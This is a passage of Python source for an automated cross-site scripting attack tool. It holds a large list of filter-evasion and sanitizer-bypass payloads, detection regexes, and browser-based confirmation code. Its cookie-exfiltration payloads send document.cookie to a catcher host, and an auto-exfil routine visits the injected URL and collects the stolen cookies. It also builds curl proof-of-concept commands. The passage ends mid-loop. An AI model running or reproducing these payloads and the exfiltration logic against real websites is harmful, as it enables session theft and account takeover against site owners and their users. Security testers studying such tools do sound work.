    {"id":"t5x_scr_tab_src",   "pl":'<script/&Tab; src=\'https://dl.dropbox.com/u/13018058/js.js\' /&Tab;></script>', "tier":5,"type":"html"},
    # iframe Tab-split base64 src
    {"id":"t5x_iframe_tab_b64","pl":'<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">',  "tier":5,"type":"html"},
    # script /**/ comment null bypass
    {"id":"t5x_scr_null_cmt",  "pl":'<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/>',  "tier":5,"type":"html"},
    # h1 onmouseover unicode alert
    {"id":"t5x_h1_uni_alert",  "pl":'&#34;&#62;<h1/onmouseover=\'\\u0061lert(1)\'>%00',  "tier":5,"type":"html"},
    # iframe data html svg entity onload
    {"id":"t5x_ifr_data_svg",  "pl":'<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">',  "tier":5,"type":"html"},
    # meta NewLine JAVASCRIPT colon refresh
    {"id":"t5x_meta_nl_js",    "pl":'<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>',  "tier":5,"type":"html"},
    # a href javascript unicode lert
    {"id":"t5x_a_js_uni_lert", "pl":'<a href="javascript&colon;\\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>',  "tier":5,"type":"html"},
    # img src backtick onerror
    {"id":"t5x_img_btick_err", "pl":'<img src=`xx:xx`onerror=alert(1)>',               "tier":5,"type":"html"},
    # iframe onreadystatechange unicode alert
    {"id":"t5x_ifr_rsc_uni",   "pl":'<iframe/onreadystatechange=\\u0061\\u006C\\u0065\\u0072\\u0074(\'\\u0061\') worksinIE>', "tier":5,"type":"html"},
    # script unicode throw alert
    {"id":"t5x_scr_uni_throw", "pl":'<script>~\'\\u0061\' ; \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073. \\u0061\\u006C\\u0065\\u0072\\u0074(~\'\\u0061\')</script>', "tier":5,"type":"js"},
    # script +-+ obfuscation
    {"id":"t5x_scr_plusminus", "pl":'<script>+-+-1-+-+alert(1)</script>',              "tier":5,"type":"js"},
    # body onload html-comment newline
    {"id":"t5x_body_cmt_load", "pl":'<body/onload=&lt;!--&gt;&#10;alert(1)>',          "tier":5,"type":"html"},
    # script itworksinallbrowsers comment
    {"id":"t5x_scr_allbrowser","pl":'<script itworksinallbrowsers>/*<script* */alert(1)</script', "tier":5,"type":"js"},
    # img src ? itworksonchrome ? onerror
    {"id":"t5x_img_chrome_q",  "pl":'<img src ?itworksonchrome?\\/onerror = alert(1)', "tier":5,"type":"html"},
    # svg script NewLine confirm
    {"id":"t5x_svg_nl_confirm","pl":'<svg><script>//&NewLine;confirm(1);</script </svg>',  "tier":5,"type":"html"},
    # a href with excess whitespace attr padding
    {"id":"t5x_a_excess_attr", "pl":'<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe', "tier":5,"type":"html"},
    # script x (IE/Safari)
    {"id":"t5x_scr_x",         "pl":'<script x> alert(1) </script 1=2>',              "tier":5,"type":"js"},
    # div onmouseover + broken style context
    {"id":"t5x_div_om_broken", "pl":'<div/onmouseover=\'alert(1)\'> style="x:">',     "tier":5,"type":"attr"},
    # dangling less-than img src onerror
    {"id":"t5x_dangling_lt",   "pl":'<--`<img/src=` onerror=alert(1)> --!>',          "tier":5,"type":"html"},
    # script src data entity-encoded
    {"id":"t5x_scr_data_ent",  "pl":'<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>', "tier":5,"type":"html"},
    # style escape then script via event
    {"id":"t5x_style_esc_scr", "pl":'</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(',  "tier":5,"type":"html"},
    # style onload HTML comment injection
    {"id":"t5x_style_onload_cmt","pl":'<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>',  "tier":5,"type":"html"},
    # triple-slash style + span onmousemove
    {"id":"t5x_trislash_span", "pl":'<///style///><span %2F onmousemove=\'alert&lpar;1&rpar;\'>SPAN', "tier":5,"type":"attr"},
    # img onmouseover Tab prompt
    {"id":"t5x_img_tab_prompt","pl":'<img/src=\'http://i.imgur.com/P8mL8.jpg\' onmouseover=&Tab;prompt(1)', "tier":5,"type":"attr"},
    # svg o-link-source body/onload confirm
    {"id":"t5x_svg_olink",     "pl":'&#34;&#62;<svg><style>{-o-link-source:\'<body/onload=confirm(1)>\'',  "tier":5,"type":"html"},
    # CR blink onmouseover prompt entity
    {"id":"t5x_cr_blink_pr",   "pl":'&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver',  "tier":5,"type":"attr"},
    # form textarea CR onkeyup unicode
    {"id":"t5x_textarea_kup",  "pl":'<form><textarea &#13; onkeyup=\'\\u0061\\u006C\\u0065\\u0072\\u0074&#x28;1&#x29;\'>',  "tier":5,"type":"attr"},
    # script confirm unicode fullwidth
    {"id":"t5x_confirm_fw",    "pl":'<script /***/>/***/confirm(\'\\uFF41\\uFF4C\\uFF45\\uFF52\\uFF54\\u1455\\uFF11\\u1450\')/***/</script /***/>',  "tier":5,"type":"js"},
    # a href void + NewLine javascript onmouseover
    {"id":"t5x_a_nl_om",       "pl":'<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>',  "tier":5,"type":"attr"},
    # script ~~~ alert(0%0)
    {"id":"t5x_scr_tilde",     "pl":'<script ~~~>alert(0%0)</script ~~~>',            "tier":5,"type":"js"},
    # div absolute iframe onmouseover prompt
    {"id":"t5x_div_abs_iframe","pl":'<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">', "tier":5,"type":"attr"},
    # img window.open onerror
    {"id":"t5x_img_winopen",   "pl":'"><img src=x onerror=window.open(\'https://www.google.com/\');>',  "tier":5,"type":"attr"},
    # img src prompt onerror
    {"id":"t5x_img_prompt_err","pl":'"><img src=x onerror=prompt(1);>',               "tier":5,"type":"attr"},
    # CSS dot-class background-image javascript:
    {"id":"t5x_css_class_bg",  "pl":'<STYLE>.XSS{background-image:url("javascript:alert(\'XSS\')")}</STYLE><A CLASS=XSS></A>', "tier":5,"type":"html"},
    # STYLE TYPE text/javascript
    {"id":"t5x_style_js_type", "pl":'<STYLE TYPE="text/javascript">alert(\'XSS\');</STYLE>',  "tier":5,"type":"html"},
    # XML namespace import
    {"id":"t5x_xml_ns",        "pl":'<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>', "tier":5,"type":"html"},
    # data URI + charset UTF-7
    {"id":"t5x_data_utf7",     "pl":'data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=', "tier":5,"type":"html"},
    # OBJECT classid
    {"id":"t5x_obj_classid",   "pl":'<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert(\'XSS\')></OBJECT>', "tier":5,"type":"html"},
    # script ^ crazy ^ tag (IE/Safari)
    {"id":"t5x_scr_hat",       "pl":'<script ^__^>alert(String.fromCharCode(49))</script ^__^>',  "tier":5,"type":"js"},
    # a href feed:javascript (Firefox old)
    {"id":"t5x_feed_js",       "pl":'<a href="feed:javascript&colon;alert(1)">click</a>',  "tier":5,"type":"html"},
    # embed SWF allowscriptaccess
    {"id":"t5x_embed_swf",     "pl":'<embed src="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></embed>',  "tier":5,"type":"html"},
    # script ReferenceError prototype name defineGetter
    {"id":"t5x_ref_err_proto", "pl":'<script>ReferenceError.prototype.__defineGetter__(\'name\', function(){alert(123)}),x</script>', "tier":5,"type":"js"},
    # script src # + {alert(1)} (quirky execution)
    {"id":"t5x_scr_hash_body", "pl":'<script src="#">{alert(1)}</script>;1',           "tier":5,"type":"js"},
    # XML version + someElement a xmlns xhtml body onload
    {"id":"t5x_xml_xhtml",     "pl":'<?xml version="1.0" ?><someElement><a xmlns:a=\'http://www.w3.org/1999/xhtml\'><a:body onload=\'alert(1)\'/></a></someElement>',  "tier":5,"type":"html"},
    # CDATA SCRIPT split (XML)
    {"id":"t5x_cdata_scr",     "pl":'<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(\'XSS\');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>',  "tier":5,"type":"html"},
    # ADw+AD4 UTF-7 alert
    {"id":"t5x_adw_utf7",      "pl":'%2BADw-script%2BAD4-alert(document.location)%2BADw-%2Fscript%2BAD4-',  "tier":5,"type":"html"},
    # ></textarea>'"><script>alert(XSS)</script>  (textarea context break)
    {"id":"t5x_textarea_brk",  "pl":"</textarea>'\"'><script>alert(XSS)</script>",     "tier":5,"type":"js"},
    # '</select><script>alert(XSS)</script>
    {"id":"t5x_select_brk",    "pl":"'></select><script>alert(XSS)</script>",          "tier":5,"type":"js"},
    # noalert/noscript bypass
    {"id":"t5x_noscript_brk",  "pl":'<html><noalert><noscript>(XSS)</noscript><script>(XSS)</script>',  "tier":5,"type":"html"},
    # </script></script><<<< multi-close
    {"id":"t5x_multi_close",   "pl":'</script></script><<<<script><>>>><<<script>alert(XSS)</script>',  "tier":5,"type":"js"},
    # a href data: blabla + script src exfil
    {"id":"t5x_a_data_blabla", "pl":'<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>',  "tier":5,"type":"html"},


    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    # TIER 5 --- mXSS (Mutation XSS) --- sanitizer bypass via DOM re-parsing
    # These bypass DOMPurify, angular sanitization, and similar filters.
    # The browser mutates the HTML after sanitizer runs --- XSS executes.
    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    {"id":"mxss_svg_style",    "pl":'<svg><p><style><g id="</style><img src=1 onerror=alert(1)>">',             "tier":5,"type":"mxss"},
    {"id":"mxss_math_ann",     "pl":'<math><annotation-xml encoding="text/html"><img src=1 onerror=alert(1)></annotation-xml></math>', "tier":5,"type":"mxss"},
    {"id":"mxss_table_svg",    "pl":'<table><td><svg><script>alert(1)</script></td></table>',                   "tier":5,"type":"mxss"},
    {"id":"mxss_noscript",     "pl":'<noscript><p title="</noscript><img src=1 onerror=alert(1)>">',            "tier":5,"type":"mxss"},
    {"id":"mxss_form_math",    "pl":'<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>', "tier":5,"type":"mxss"},
    {"id":"mxss_ruby",         "pl":'<ruby><rt><![CDATA[x]]></rt><script>alert(1)</script></ruby>',            "tier":5,"type":"mxss"},
    {"id":"mxss_style_chr",    "pl":'<style>@charset "\";}</style><script>alert(1)</script>',                  "tier":5,"type":"mxss"},
    {"id":"mxss_svg_ns",       "pl":'<svg xmlns="http://www.w3.org/2000/svg"><script xmlns="">alert(1)</script></svg>', "tier":5,"type":"mxss"},
    {"id":"mxss_math_mglyph",  "pl":'<math><mtext><table><mglyph><style><img src onerror=alert(1)>',           "tier":5,"type":"mxss"},
    {"id":"mxss_svg_animate",  "pl":'<svg><animate attributeName=href values=javascript:alert(1) /><a id=x><rect width=100 height=100 /></a></svg>', "tier":5,"type":"mxss"},
    {"id":"mxss_select",       "pl":'<select><option><img src=1 onerror=alert(1)></option></select>',          "tier":5,"type":"mxss"},
    {"id":"mxss_svg_a_xlink",  "pl":'<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><circle r=400 /></a></svg>', "tier":5,"type":"mxss"},
    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    # TIER 6 --- cookie exfiltration (fires after tier ---5 confirm XSS)
    # Only used when a catcher URL is available.
    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    {"id":"t6_ck_img",        "pl":'<img src=x onerror="document.location=\'CATCHER?c=\'+document.cookie">',  "tier":6,"type":"cookie"},
    {"id":"t6_ck_fetch",      "pl":"<script>fetch('CATCHER?c='+encodeURIComponent(document.cookie))</script>", "tier":6,"type":"cookie"},
    {"id":"t6_ck_img2",       "pl":"<script>new Image().src='CATCHER?c='+document.cookie</script>",            "tier":6,"type":"cookie"},
    {"id":"t6_ck_loc",        "pl":'<svg onload="document.location=\'CATCHER?c=\'+document.cookie">',          "tier":6,"type":"cookie"},
    {"id":"t6_ck_iframe",     "pl":'<iframe src="javascript:document.location=\'CATCHER?c=\'+parent.document.cookie">',  "tier":6,"type":"cookie"},
]

# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# XSS CONFIRMATION PATTERNS
# Applied by XSSVerifier to decide if a reflection is live XSS.
# Covers all new event handlers, elements, and JS call patterns added above.
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
XSS_CONFIRM_RE = [
    # Script block variations with execution sinks
    re.compile(r'<script[^>]*>.*?(?:alert|confirm|prompt|print|document\.write|eval)\s*\(', re.I | re.S),
    # Broad event handler detection: onxxxx=...[sink]...
    re.compile(r'\bon[a-z]+\s*=\s*["\']?[^"\'>]*(?:alert|confirm|prompt|print|eval|atob|String\.fromCharCode)\s*[\(`]', re.I),
    # Prototype/Protocol handlers in URI attributes
    re.compile(r'(?:href|src|action|formaction|data|background|xlink:href)\s*=\s*["\']?\s*(?:javascript|data):', re.I),
    # CSS expressions for older/compatibility modes
    re.compile(r'style\s*=\s*["\']?[^"\'>]*expression\s*\(', re.I),
    # Modern HTML5 elements and auto-firing events (ontoggle, onfocusin, etc.)
    re.compile(r'<(?:svg|details|iframe|audio|video|input|keygen|body|html|marquee|object|embed|isindex|table|math|mglyph)[^>]*on(?:load|error|toggle|focus|pageshow|focusin|focusout|hashchange|resize|scroll|message|popstate|touchstart|touchend|touchmove|unhandledrejection|wheel|afterprint|beforeprint|beforeunload|start|finish|pointerdown|pointerup)\s*=', re.I),
    # Iframe srcdoc injection
    re.compile(r'srcdoc\s*=\s*["\']?\s*<', re.I),
    # Obfuscated JS call patterns (backticks, array accessors, base36)
    re.compile(r'(?:alert|confirm|prompt|print|eval)`\d+`', re.I),
    re.compile(r'\[\d+\]\.find\s*\(\s*(?:alert|confirm|prompt|print)\s*\)', re.I),
    re.compile(r'(?:top|window|self|parent|frames|this)\[["\']?(?:al|con|pro|pri)[^"\'\]]*["\']?\]\s*[\(`]', re.I),
    re.compile(r'eval\s*\(\s*(?:URL|location|name|atob|decodeURIComponent|history\.state|location\.hash)', re.I),
    re.compile(r'8680439\.\.toString', re.I), # base36 'alert'
    # mXSS and dangerous DOM assignments
    re.compile(r'\.innerHTML\s*=\s*location', re.I),
    re.compile(r'annotation-xml[^>]*encoding.*text/html', re.I),
]


# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# FILTER ANALYZER --- characterizes WAF/Sanitizer behavior
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
class FilterAnalyzer:
    """
    Performs lightweight character survivability tests to understand:
    - which characters are blocked
    - which are encoded
    - which pass unchanged
    - event handler separators and tag breakout possibilities
    """
    CHARMAP = {
        "<":     "lt",
        ">":     "gt",
        "'":     "sq",
        "\"":    "dq",
        "/":     "slash",
        "=":     "eq",
        "(":     "lpar",
        ")":     "rpar",
        "`":     "bt",
        ";":     "sem",
    }

    def __init__(self, client):
        self.client = client

    def analyze(self, url, method, param, all_params, hidden):
        """Returns a dict of character behavior: {char: status}"""
        results = {}
        # Test each char individually for clean-signal reflection
        for char, name in self.CHARMAP.items():
            test_val = f"FX{char}X"
            fill = {**{p: "test" for p in all_params if p != param},
                    **(hidden or {}), param: test_val}
            try:
                resp = (self.client.post(url, fill) if method == "POST"
                        else self.client.get(url, fill))
                body = resp.get("body", "")
                if test_val in body:
                    results[char] = "pass"
                elif f"FX{self._escape(char)}X" in body:
                    results[char] = "encoded"
                else:
                    results[char] = "blocked"
            except Exception:
                results[char] = "error"
        return results

    @staticmethod
    def _escape(char):
        return char.replace("<","&lt;").replace(">","&gt;").replace("\"","&quot;").replace("'","&#39;")


# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# PLAYWRIGHT VALIDATOR --- runtime browser confirmation
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
class PlaywrightValidator:
    """
    Headless browser validation for high-confidence XSS findings.
    Monitors dialogs, console events, and DOM markers.
    Captures proof (screenshots + DOM snapshots).
    """
    def __init__(self, headless=True, evidence_dir="./evidence"):
        self.headless = headless
        self.evidence_dir = evidence_dir
        if not os.path.exists(evidence_dir):
            os.makedirs(evidence_dir)

    def validate(self, url, method, param, payload, all_params, hidden=None):
        if not PLAYWRIGHT_INSTALLED:
            return False, None, ["playwright-not-installed"]

        confirmed, events, screenshot_path = False, [], None
        full_params = {**{p: "test" for p in all_params if p != param}, **(hidden or {}), param: payload}

        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=self.headless)
                context = browser.new_context(ignore_https_errors=True)
                page = context.new_page()
                _dialog_fired = threading.Event()

                def handle_dialog(d):
                    nonlocal confirmed, screenshot_path
                    msg = f"{d.type}:{d.message}"
                    m_lower = msg.lower()
                    if any(x in m_lower for x in ["alert", "confirm", "prompt", "1", "xs5"]):
                        confirmed = True
                        events.append(f"dialog:CONFIRMED:{msg[:50]}")
                        # Screenshot BEFORE dismiss so popup is visible in evidence
                        try:
                            ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
                            safe = "".join(c for c in param if c.isalnum())
                            fname = f"xss_{safe}_{ts}.png"
                            screenshot_path = os.path.join(self.evidence_dir, fname)
                            page.screenshot(path=screenshot_path)
                        except Exception as se:
                            events.append(f"ss-err:{str(se)[:40]}")
                    else:
                        events.append(f"dialog:LOG:{msg[:30]}")
                    try: d.dismiss()
                    except Exception: pass
                    _dialog_fired.set()

                page.on("dialog", handle_dialog)
                page.on("console", lambda m: events.append(f"console:{m.type}:{m.text[:40]}"))
                page.on("pageerror", lambda e: events.append(f"js-err:{str(e)[:50]}"))

                try:
                    if method == "GET":
                        target = url + ("&" if "?" in url else "?") + urllib.parse.urlencode(full_params)
                        page.goto(target, timeout=12000, wait_until="domcontentloaded")
                    else:
                        page.goto("about:blank")
                        form_html = f"""
                        <form id="pk" method="POST" action="{url}">
                            {" ".join([f'<input type="hidden" name="{k}" value="{str(v).replace(chr(34), "&quot;")}">' for k,v in full_params.items()])}
                        </form>
                        <script>document.getElementById('pk').submit();</script>
                        """
                        page.set_content(form_html)
                    # Event-driven wait — exits immediately when dialog fires
                    _dialog_fired.wait(timeout=4.0)
                except Exception as e:
                    events.append(f"nav-err:{str(e)[:40]}")

                browser.close()
        except Exception as e:
            events.append(f"pw-err:{str(e)[:40]}")

        return confirmed, screenshot_path, events


# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# CONFIDENCE SCORER
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
class Scorer:
    """Calculates a confidence score (0-100) based on multiple heuristics."""
    @staticmethod
    def calculate(sigs, how, ctx, confirmed, pw_confirmed=False):
        score = 0
        # Reflection quality (0-30)
        if how == "exact":    score += 30
        elif how == "case":   score += 20
        elif "fragment" in how: score += 10
        
        # Context (0-20)
        if ctx == "js":       score += 20
        elif ctx == "attr":   score += 15
        elif ctx == "html":   score += 10
        
        # Signals (0-30)
        for sig in sigs:
            if "pattern:" in sig: score += 10
        score = min(score, 80) # Cap before browser confirm
        
        # Browser confirmation (0-20 bonus)
        if pw_confirmed:
            score = 100
        elif confirmed:
            score += 20
            
        return min(max(score, 0), 100)


# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# XSS VERIFIER  v2  --- context-aware, low false-negative, 5-stage
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
class XSSVerifier:
    """
    5-stage verification pipeline.
    FIXED: Deep context detection, fragment-based partial bypass detection, 
           and smart URL breakout logic.
    """
    _FRAGS = [
        "<script", "<svg", "<img", "<iframe", "onerror=", "onload=", "onclick=", "onfocus=", "ontoggle=",
        "alert(", "alert`", "confirm(", "prompt(", "javascript:", "document.cookie", ".innerHTML"
    ]

    def __init__(self, client):
        self.client = client

    @staticmethod
    def _detect_context(body, val):
        """Stateful detection of the reflection context."""
        pos = body.lower().find(val.lower())
        if pos == -1: return "unknown"
        chunk = body[:pos]
        
        # 1. Script block check
        if chunk.lower().count("<script") > chunk.lower().count("</script"):
            return "js"
        # 2. HTML Comment check
        if chunk.count("<!--") > chunk.count("-->"):
            return "comment"
        # 3. Tag attribute check
        last_lt = chunk.rfind("<")
        last_gt = chunk.rfind(">")
        if last_lt > last_gt:
            at_chunk = chunk[last_lt:].lower()
            if any(x in at_chunk for x in ["href=", "src=", "action=", "data="]):
                return "url_attr"
            return "attr"
        return "html"

    def _reflected(self, body, payload):
        ctx = self._detect_context(body, payload)
        if payload in body: return True, "exact", ctx
        if payload.lower() in body.lower(): return True, "case", ctx
        
        # Fragment match: Catch cases where tags are stripped but logic remains
        matched = [f for f in self._FRAGS if f in payload.lower() and f in body.lower()]
        if len(matched) >= 2 or (len(matched) == 1 and "<" in matched[0]):
            return True, f"fragment:{matched[0]}", ctx
        return False, "none", "unknown"

    @staticmethod
    def _is_json_response(resp):
        """True when the server returned application/json content."""
        if not resp: return False
        hdrs = resp.get("headers", {})
        ct = hdrs.get("Content-Type", hdrs.get("content-type", "")).lower()
        return "application/json" in ct or "text/json" in ct

    def verify(self, url, method, param, all_params, payload, baseline_body, hidden=None):
        fill = {**{p: "test" for p in all_params if p != param}, **(hidden or {}), param: payload}
        resp = self.client.post(url, fill) if method == "POST" else self.client.get(url, fill)
        if not resp: return False, [], None
        body = resp["body"]

        # JSON API endpoint: skip HTML verification, flag as API reflection for SPA analysis
        if self._is_json_response(resp):
            if payload in body:
                return True, ["reflect:exact:json_api", "api:unescaped_in_json"], resp
            if payload.lower() in body.lower():
                return True, ["reflect:case:json_api", "api:unescaped_in_json"], resp
            return False, [], resp
        
        reflected, how, ctx = self._reflected(body, payload)
        if not reflected: return False, [], resp
        sigs = [f"reflect:{how}:{ctx}"]
        
        # Escape check: Only reject if NO breakout characters or raw signals survived
        if all(x in body for x in [payload.replace("<","&lt;"), payload.replace(">","&gt;")]) and "<" not in body:
            if ctx != "js": return False, ["escaped"], resp

        new_pats = self._new_patterns(body, baseline_body, payload)
        sigs.extend(new_pats)

        # Smart Breakout Logic: Never reject url_attr if quotes or tag closers survived
        if ctx == "url_attr" and not new_pats:
            if not any(c in payload and c in body for c in ['"', "'", ">", "<"]):
                return False, ["url_only"], resp

        confirmed = bool(new_pats) or (how in ("exact", "case") and ctx in ("html", "attr", "js", "url_attr"))
        return confirmed, sigs, resp

    def _new_patterns(self, body, baseline, payload):
        return ["pattern:"+p.pattern[:30] for p in XSS_CONFIRM_RE if p.search(body) and not p.search(baseline)]

    def verify_stored(self, token, url):
        """Check if a stored XSS token appears unescaped in a retrieval URL."""
        try:
            resp = self.client.get(url)
            body = resp.get("body", "")
            if token not in body: return False
            esc = token.replace("<","&lt;").replace(">","&gt;")
            return not (esc in body and token not in body)
        except Exception: return False

# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# PoC BUILDER
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
class PoC:
    @staticmethod
    def _qs(param, payload, all_params, hidden):
        all_p = {**{p: "test" for p in all_params}, **(hidden or {})}
        enc   = urllib.parse.quote(payload, safe="")
        parts = []
        for k, v in all_p.items():
            parts.append(urllib.parse.quote(k) + "=" +
                         (enc if k == param
                          else urllib.parse.quote(str(v))))
        if param not in all_p:
            parts.append(urllib.parse.quote(param) + "=" + enc)
        return "&".join(parts)

    @staticmethod
    def curl(url, method, param, payload, all_params, hidden=None):
        qs = PoC._qs(param, payload, all_params, hidden)
        if method == "GET":
            return f'curl -sk "{url}?{qs}"'
        return f'curl -sk -X POST "{url}" \\\n  -d "{qs}"'

    @staticmethod
    def browser(url, method, param, payload, all_params, hidden=None):
        if method != "GET": return None
        return url + "?" + PoC._qs(param, payload, all_params, hidden)

    @staticmethod
    def cookie_pocs(url, method, param, all_params, catcher, hidden=None):
        pocs = []
        for pd in PAYLOADS:
            if pd["type"] != "cookie": continue
            pl = pd["pl"].replace("CATCHER", catcher)
            pocs.append({
                "desc":    pd["id"],
                "curl":    PoC.curl(url, method, param, pl, all_params, hidden),
                "browser": PoC.browser(url, method, param, pl, all_params, hidden),
                "raw":     pl,
            })
        return pocs


# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# XSS TESTER  --- HELLHOUND-style output + progress bars
# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
class XSSTester:
    def __init__(self, client, tier=1, delay=0.0, catcher=None, hud_state=None):
        self.client   = client
        self.tier     = tier
        self.delay    = delay
        self.catcher  = catcher
        self.hud      = hud_state
        self.verifier = XSSVerifier(client)
        self.analyzer = FilterAnalyzer(client)
        self.pw       = PlaywrightValidator(headless=True)
        self.findings = []
        self._lock    = threading.Lock()
        self._catcher_obj = None

    def _baseline(self, url, method, params, hidden):
        try:
            r = (self.client.post(url, {**hidden, **params}) if method == "POST"
                 else self.client.get(url, params))
            return r["body"] if r else ""
        except Exception: return ""

    def _print_hit(self, url, method, param, payload, sigs,
                   sc, burl, ck_pocs, score, stolen=None, pw_ev=None, screenshot=None):
        """Clean, high-visibility finding report."""
        tprint(f"\n[bold white on red] FOUND [/] [bold white]{url}[/]")
        
        info_line = (f"  [dim]param:[/] [bold orange3]{param}[/] "
                     f" [dim]| score:[/] [bold {'green' if score >= 80 else 'yellow'}]{score}%[/] "
                     f" [dim]| status:[/] [bold white]{sc}[/]")
        tprint(info_line)
        
        tprint(f"  [dim]payload:[/] [bold red]{payload[:110]}[/]")
        
        if sigs:
            tprint(f"  [dim]signals:[/] [bold green]{', '.join(sigs[:5])}[/]")

        if pw_ev and pw_ev != ["skipped:json_api_endpoint"]:
            tprint(f"  [dim]browser:[/] [bold cyan]CONFIRMED[/] [dim]via Playwright[/]")
            for ev in pw_ev: tprint(f"    [dim]->[/] [dim]{ev}[/]")
        elif pw_ev == ["skipped:json_api_endpoint"]:
            tprint(f"  [dim]browser:[/] [bold yellow]SKIPPED[/] [dim]— JSON API; SPA frontend may render payload[/]")

        if screenshot:
            tprint(f"  [dim]evidence:[/] [bold green]{screenshot}[/]")
        
        if stolen:
            tprint(f"  [dim]cookie :[/] [bold orange3]{stolen}[/]")
        tprint(Rule(style="dim"))

    def _auto_exfil(self, ck_pocs, catcher_obj):
        """Agent visits the XSS URL and waits for cookie to arrive."""
        if not ck_pocs or not catcher_obj: return None
        for cp in ck_pocs:
            burl = cp.get("browser")
            if not burl: continue
            before = len(CookieCatcher.caught)
            try: self.client.get_raw(burl)
            except Exception: pass
            deadline = time.time() + 4.0
            while time.time() < deadline:
                with CookieCatcher._lock:
                    if len(CookieCatcher.caught) > before:
                        return CookieCatcher.caught[-1]["cookie"]
                time.sleep(0.15)
        return None

    def _probe_context(self, url, method, param, all_params, hidden):
        """
        Send a unique canary value to detect where the param is reflected.
        Returns: "html" | "attr" | "js" | "url_attr" | "json_api" | "unknown" | "none"
        json_api = response is application/json (SPA data endpoint — browser won't execute JS directly)
        """
        canary = "XS5CTX" + "".join(random.choices(string.ascii_lowercase, k=6))
        fill   = {**{p: "test" for p in all_params if p != param},
                  **(hidden or {}), param: canary}
        try:
            resp = (self.client.post(url, fill) if method == "POST"
                    else self.client.get(url, fill))
            if XSSVerifier._is_json_response(resp):
                return "json_api"
            body = resp.get("body", "")
            if canary not in body: return "none"
            return XSSVerifier._detect_context(body, canary)
        except Exception:
            return "unknown"

    @staticmethod
    def _prioritise_payloads(payloads, ctx, tier_cap):
        """
        Re-order payload list to put context-appropriate payloads first.
        json_api: prefer plain html/poly payloads — SPA framework renders the value into DOM.
        """
        ctx_types = {
            "html":     ["html", "poly", "mxss"],
            "attr":     ["attr", "html", "poly"],
            "js":       ["js",   "poly", "attr"],
            "url":      ["html", "attr"],
            "url_attr": ["attr", "html", "poly"],
            "json_api": ["html", "poly", "attr", "mxss"],
            "unknown":  ["html", "attr", "js", "poly", "mxss"],
            "none":     ["html", "attr", "js", "poly", "mxss"],
        }
        priority = ctx_types.get(ctx, ctx_types["unknown"])
        tier_ok  = [p for p in payloads
                    if p["tier"] <= tier_cap and p["type"] != "cookie"]
        first  = [p for p in tier_ok if p["type"] in priority]
        rest   = [p for p in tier_ok if p["type"] not in priority]
        return first + rest

    def test_endpoint(self, n, tot, url, method, params, hidden, progress_bar=None, task_id=None):
        pnames = list(params.keys()); baseline = self._baseline(url, method, params, hidden)
        if progress_bar and task_id:
            progress_bar.update(task_id, description=f"[cyan]Testing {url[:40]}...")

        exfil_targets = []  # Collect confirmed params for cookie exfil at end

        for param in pnames:
            param_confirmed = False
            self.analyzer.analyze(url, method, param, pnames, hidden)
            ctx     = self._probe_context(url, method, param, pnames, hidden)
            ordered = self._prioritise_payloads(PAYLOADS, ctx, self.tier)

            for pd in ordered:
